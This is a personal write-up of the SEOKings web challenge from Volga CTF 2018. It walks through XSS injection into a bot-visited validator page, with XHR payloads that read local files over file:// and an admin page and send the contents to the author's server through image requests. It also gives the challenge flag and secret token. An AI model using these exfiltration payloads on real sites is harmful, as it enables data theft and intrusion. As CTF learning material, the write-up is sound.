It's write up of SEOKings ( points 350 ) web problem of Volga CTF 2018.

It was a long problem, also it was the first time, that I did some xss stuff.

Let's dive into the problem.

The website looks like this :

Main Page
    Main Page


You can see the Try button, and the input box above it, where you can insert the website for the company to have a look at.

At first I tried looking for 'robots.txt' on the site but it didn't reveal anything, except something about a 'config.ru' file ( look at the bottom of the page, in red ).

Robots.txt - /opt/seo-kings/config.ru
    Robots.txt - /opt/seo-kings/config.ru

Then I tried '/admin' directory, just some common directory , well this is what I got :

    Admin - Please, use local IP

Now, it was certain that you can't directly access it, so I started looking into ways to access it from local IP.

Searching around I stumbled upon a NULLCon '13 question's write-up here, through this I came to know about an accidentally found bug in stackoverflow through a header as mentioned here.

So I set it like this :

`X-Forwarded-For: 127.0.0.1`

Still the same, tried with localhost but nothing changed. Then it clicked me, maybe XSS might work. I made a simple script to get the cookie like this ( It's the most basic of XSS perhaps ) :

```
" /><img src="x" onerror="http://my_server_ip/?cookie='+document.cookie'"></img>
```

but it didn't work, then I changed it a bit to this :

```
" /><img src="http://my_server_ip/?cookie='+document.cookie'"></img>
```

and lo behold I got a ping on my server, however as there wasn't any cookie so I didn't get any but the point is XSS 's working.

```
188.246.233.46 - - [24/Mar/2018:17:56:25 +0000] "GET / HTTP/1.1" 200 3525 "http://localhost:8080/validator?site=%22%20/%3E%3Cimg%20src=%22http://my_server_ip_here/%22%3E%3C/img%3E" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.8 Safari/534.34"
```

So, now I had to get the bot ( phantomJS ) to visit '/admin' , somehow .

I tried adding iframes to the page and accessing it's content but I wasn't getting anything.

Told the admin about it, he suggested instead of iframe I should try using xhr. Well it was the first time I was doing xss , so I didn't thought I might actually solved it. By now it was 4 am ( IST ) and I had been doing it for the past 4 hours with somewhat little progress.

I started back after some good sleep and trying on some other problems. Later in the afternoon I made a simple script called payload.js to get the page using xhr and it's contents.
```
try{
    var data = null;
    var xhr = new XMLHttpRequest();
    //xhr.withCredentials = true;
    xhr.addEventListener("readystatechange", function () {
      if (this.readyState === 4) {
        new Image().src="http://my_server_ip/?from_admin_payload="+this.responseText;
      }
     else{
       new Image().src="http://my_server_ip/?xhr_not_executed";
      }
   });
  xhr.open("GET", "/admin");
  xhr.send(data);
}
catch(err){
  new Image().src="http://my_server_ip/?err="+err.message;
}
```
Well this also didn't help much, I wasn't getting anything, after 15 minutes I thought maybe I might be getting something in the headers, changed the JS code, added this

new Image().src="http://my_server_ip/?rsp_headers="+String(this.getAllResponseHeaders());

Still nothing :(

Well, it definitely has something evil going on, by now only one hour was left for the CTF to end, I asked one of the admins, he suggested I use file protocol to get 'some file'. Well file protocol, is used to access files on local system. Now, it clicked to me about the hint on 'robots.txt' page /opt/seo-kings/config.ru

I changed last line of the xhr request to this :

```
xhr.open("GET", "file:///opt/seo-kings/config.ru");
```

Nothing worked, now it was confusing , I pinged the admin again and it was silly of me to make the request 'asynchronously', well I don't know js much, and as the clock was ticking so didn't care to look for the function definition of xhr.open() , the third parameter was to be made false to make a synchronous request.

The whole script was generated by '**Postman**', I just made the request and clicked on it's code option to get a xhr code ( sweet :p ). So, obviously I didn't know about the synchronous/ asynchronous thing here.

Anyway coming back to the point, I changed it to :

```
xhr.open("GET", "file:///opt/seo-kings/config.ru", false);
```

Well, now I was getting something, decoded the url-encoded string to this :

```
require 'sinatra'
require "open-uri"
require 'openssl'
require 'uri'
require 'sinatra/base'
Dir.glob('./app/{controllers}/*.rb').each { | file | require file
}
map('/') {
    run MainController
}
map('/admin') {
    run AdminController
}

```
Well now, only 15 minutes were left, it was the first time I had seen **sinatra** web application, quickly
googled the directory structure of it and got this here

So, I had to get the file `'/opt/seo-kings/controllers/admin_controller.rb`.
I quickly changed it the script and got the file like this :
```
require './app/controllers/application_controller.rb'
class AdminController < ApplicationController OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE SECRET_TOKEN = "d595462f496fd347796b60b605b72ff6"
get '/'
do
    if local ? token = params[: token]
if (token == SECRET_TOKEN) @flag = Flagclass::FLAG erb: flag end
else "Please, use local ip"
end
end end 
```
Well so I had to add a `GET` parameter named `token` to the **admin** endpoint to get it.
So, finally I changed the `payload.js` to this :

```
try{
var data = null;

var xhr = new XMLHttpRequest();
var url = "http://my_server_ip/?";
xhr.addEventListener("readystatechange", function () {
  if (this.readyState === 4) {
//	new Image().src=url+JSON.stringify(this);
	new Image().src=url+"from_admin_payload="+String(this.responseText);
//	var responseHeaders = this.getAllResponseHeaders();
//	new Image().src=url+"rsp_headers="+String(this.getAllResponseHeaders());
  }
else{
	new Image().src=url+"xhr_not_executed";
	new Image().src=url+JSON.stringify(this.responseText);

}
});
var base = "file:///opt/seo-kings/"
var filename = "app/controllers/admin_controller.rb"
//xhr.open("GET", base+filename,false);
xhr.open("GET", "/admin?token=d595462f496fd347796b60b605b72ff6",false);
xhr.send(data);
}
catch(err){
	new Image().src="http://my_server_ip/?err="+err.message;
}
```
And lo behold here comes the flag :

```
<!DOCTYPE html>
<html>

<head>
    <title></title>
</head>

<body>VolgaCTF{hope_it_was_like_madness}</body>

</html> 
```

Well, as mentioned earlier, the CTF had ended 5 minutes earlier .

But it was fun challenge and definitely got me to learn a lot many things about XSS.

Thanks.
